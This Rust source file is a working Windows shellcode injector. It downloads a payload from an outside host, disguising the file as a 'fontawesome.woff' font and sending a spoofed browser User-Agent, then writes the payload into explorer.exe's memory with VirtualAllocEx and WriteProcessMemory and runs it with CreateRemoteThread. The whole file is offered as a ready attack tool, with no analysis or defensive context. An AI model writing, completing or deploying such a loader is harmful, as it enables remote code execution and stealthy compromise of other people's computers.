extern crate kernel32;
use reqwest;
use std::ptr;
use winapi::um::winnt::{PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
use sysinfo::{PidExt, ProcessExt, System, SystemExt};


fn download_shellcode_from_url(url: &str) -> Result<Vec<u8>, &'static str> {
    let client = reqwest::blocking::Client::new();
    let req = client.get(url)
    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.3");

    let res = req.send();
    match res {
        Ok(response) => {
            if response.status().is_success() {
                let shellcode = response.bytes().unwrap().to_vec();
                Ok(shellcode)
            } else {
                Err("Failed to download shellcode from the URL.")
            }
        }
        Err(_) => {
            Err("Failed to download shellcode from the URL.")
        }
    }
}

fn find_process_by_name(process_name: &str) -> u32 {
    let sys = System::new_all();
    let pid = sys.processes_by_exact_name(process_name).next().expect("Error finding process").pid();
    pid.as_u32()
}

fn main() {
    let shellcode_url: &str = "http://192.168.8.188:8003/fontawesome.woff";
    let shellcode: Vec<u8>;
    match download_shellcode_from_url(shellcode_url) {
        Ok(downloaded_bytes) => {
            shellcode = downloaded_bytes;
        }
        Err(e) => {
            panic!("{}", e);
        }
    }

    println!("Downloaded shellcode: {} bytes", shellcode.len());

    let process_name = "explorer.exe";
    let pid = find_process_by_name(process_name);
    println!("Found process: {} with PID: {}", process_name, pid);

    unsafe {
        let handler = kernel32::OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        let address = kernel32::VirtualAllocEx(handler, ptr::null_mut(), shellcode.len() as u64, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        let mut bytes_written = 0;
        kernel32::WriteProcessMemory(handler, address, shellcode.as_ptr() as *mut _, shellcode.len() as u64, &mut bytes_written);
        kernel32::CreateRemoteThread(handler, ptr::null_mut(), 0, Some(std::mem::transmute(address)), ptr::null_mut(), 0, ptr::null_mut());
        kernel32::CloseHandle(handler);
    }
    println!("Shellcode injected successfully.")
}
